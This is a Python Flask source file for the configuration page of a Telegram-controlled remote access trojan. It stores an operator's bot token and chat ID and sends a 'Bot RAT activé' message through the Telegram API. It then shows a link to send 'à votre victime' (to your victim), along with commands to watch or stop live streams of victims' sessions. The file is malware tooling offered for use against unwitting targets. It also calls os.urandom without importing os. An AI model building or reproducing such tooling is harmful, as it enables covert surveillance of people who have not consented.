from flask import Flask, request, render_template_string
from .config import save_config, get_config
import requests

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Configuration Bot</title>
    <style>
        body { font-family: Arial; max-width: 500px; margin: 50px auto; padding: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { background: #0088cc; color: white; border: none; padding: 15px; width: 100%; cursor: pointer; }
        .success { background: #4CAF50; color: white; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .link { background: #f0f0f0; padding: 15px; word-break: break-all; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Configuration Telegram Bot</h1>
    {% if not configured %}
    <form method="POST">
        <input type="text" name="token" placeholder="Token du bot Telegram (ex: 123456:ABC...)" required>
        <input type="text" name="chat_id" placeholder="Votre Chat ID (ex: 12345678)" required>
        <button type="submit">Activer le Bot</button>
    </form>
    {% else %}
    <div class="success">
        <h3>Bot activé !</h3>
        <p>Envoyez ce lien à votre victime :</p>
        <div class="link">{{ victim_link }}</div>
        <br>
        <p>Commandes Telegram :</p>
        <ul>
            <li><b>/start</b> - Voir les sessions actives</li>
            <li><b>/watch [id]</b> - Démarrer le stream</li>
            <li><b>/stop [id]</b> - Arrêter le stream</li>
        </ul>
    </div>
    {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    config = get_config()
    
    if request.method == "POST":
        token = request.form.get("token")
        chat_id = request.form.get("chat_id")
        save_config(token, chat_id)
        
        # Envoyer message test
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": "🤖 Bot RAT activé!\nUtilisez /start pour commencer."})
        except:
            pass
            
        config = get_config()
    
    victim_link = f"https://{request.headers.get('host', 'votre-site.vercel.app')}/victim/x{os.urandom(4).hex()}"
    
    return render_template_string(HTML, 
                                  configured=config["active"], 
                                  victim_link=victim_link)

if __name__ == "__main__":
    app.run()
